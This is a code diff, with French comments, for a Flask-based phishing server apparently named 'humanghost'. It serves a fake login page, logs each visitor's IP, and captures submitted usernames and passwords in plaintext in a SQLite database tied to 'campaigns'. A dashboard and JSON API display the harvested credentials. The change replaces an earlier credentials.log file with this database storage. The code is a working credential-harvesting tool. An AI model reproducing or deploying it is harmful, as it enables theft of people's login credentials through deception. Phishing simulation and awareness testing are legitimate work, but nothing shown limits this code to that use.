@@ -1,83 +1,98 @@
-from flask import Flask, render_template_string, request, redirect, render_template
+from flask import Flask, render_template_string, request, redirect, render_template, jsonify
 from flask_socketio import SocketIO
+from .models import db, Campaign, Event  # Importe les modèles
 import os
 from datetime import datetime
 import threading
 
-# On crée une instance de SocketIO qui sera utilisée par l'application
 socketio = SocketIO()
 
 def create_app(config):
-    """
-    Crée et configure l'application Flask et SocketIO.
-    Cette fonction 'factory' est une bonne pratique pour les projets Flask.
-    """
     app = Flask(__name__, template_folder=os.path.abspath('templates'))
-    app.config['SECRET_KEY'] = 'humanghost-secret-key!' # Nécessaire pour SocketIO
-    
-    # Page de phishing principale
+    app.config['SECRET_KEY'] = 'humanghost-secret-key!'
+    # Configuration de la base de données SQLite
+    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///humanghost.db'
+    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+    # Lie l'instance de la base de données à l'application
+    db.init_app(app)
+
+    with app.app_context():
+        # Crée les tables si elles n'existent pas
+        db.create_all()
+
+        # Crée une nouvelle campagne à chaque lancement du serveur (pour la démo)
+        # Dans une version plus avancée, on la gérerait via la CLI
+        current_campaign = Campaign(name=config.get('name', 'Campagne sans nom'))
+        db.session.add(current_campaign)
+        db.session.commit()
+        app.config['CAMPAIGN_ID'] = current_campaign.id
+
     @app.route("/")
     def index():
-        # Log de l'événement de visite
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        socketio.emit('update', {
-            'timestamp': timestamp,
-            'type': 'event',
-            'event': 'Visite de la page',
-            'details': f"IP: {request.remote_addr}"
-        })
+        campaign_id = app.config['CAMPAIGN_ID']
+        new_event = Event(
+            campaign_id=campaign_id,
+            ip_address=request.remote_addr,
+            event_type='Visit'
+        )
+        db.session.add(new_event)
+        db.session.commit()
+        socketio.emit('update', new_event_to_dict(new_event))
         
         with open(os.path.join(app.template_folder, config['server']['template']), "r") as f:
-            template_content = f.read()
-        return render_template_string(template_content)
+            return render_template_string(f.read())
 
-    # Route pour capturer les identifiants
     @app.route("/login", methods=['POST'])
     def login():
+        campaign_id = app.config['CAMPAIGN_ID']
         username = request.form.get('username')
         password = request.form.get('password')
-        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        log_line = f"Username: {username}, Password: {password}"
-        print(f"[+] Identifiants capturés : {log_line}")
-
-        # Envoi de l'événement au tableau de bord via WebSocket
-        socketio.emit('update', {
-            'timestamp': timestamp,
-            'type': 'credential',
-            'event': 'Identifiants Capturés',
-            'details': log_line
-        })
-
-        # Enregistrement dans le fichier de log
-        with open("credentials.log", "a") as log_file:
-            log_file.write(f"[{timestamp}] - {log_line} (IP: {request.remote_addr})\n")
+        new_event = Event(
+            campaign_id=campaign_id,
+            ip_address=request.remote_addr,
+            event_type='Credential Submission',
+            details=f"Username: {username}, Password: {password}"
+        )
+        db.session.add(new_event)
+        db.session.commit()
+        socketio.emit('update', new_event_to_dict(new_event))
             
         return redirect(config['server']['redirect_url'])
 
-    # Route pour le tableau de bord
     @app.route("/dashboard")
     def dashboard():
-        return render_template("dashboard.html")
+        # Le tableau de bord affiche maintenant toutes les campagnes
+        campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
+        return render_template("dashboard.html", campaigns=campaigns)
+        
+    @app.route("/api/campaign/<int:campaign_id>/events")
+    def get_events(campaign_id):
+        # API pour que le tableau de bord récupère les événements d'une campagne
+        events = Event.query.filter_by(campaign_id=campaign_id).order_by(Event.timestamp.desc()).all()
+        return jsonify([new_event_to_dict(e) for e in events])
 
-    # Initialisation de l'application avec SocketIO
     socketio.init_app(app)
     return app
 
+def new_event_to_dict(event):
+    """Utilitaire pour convertir un objet Event en dictionnaire."""
+    return {
+        'timestamp': event.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
+        'type': 'credential' if 'Credential' in event.event_type else 'event',
+        'event': event.event_type,
+        'details': event.details or f"IP: {event.ip_address}"
+    }
+
+# La fonction run_server_in_thread ne change pas
 def run_server_in_thread(config):
-    """
-    Lance le serveur Flask dans un thread séparé pour ne pas bloquer
-    l'exécution du script principal.
-    """
     app = create_app(config)
     host = config['server'].get('host', '0.0.0.0')
     port = config['server'].get('port', 5000)
-    
     print(f"[*] Faux site accessible sur http://{host}:{port}")
     print(f"[*] Tableau de bord accessible sur http://{host}:{port}/dashboard")
-    
-    # Utilisation de socketio.run() au lieu de app.run()
     server_thread = threading.Thread(target=socketio.run, args=(app,), kwargs={'host': host, 'port': port, 'allow_unsafe_werkzeug': True})
-    server_thread.daemon = True # Permet au script principal de se terminer même si le thread tourne
+    server_thread.daemon = True
     server_thread.start()
     return server_thread
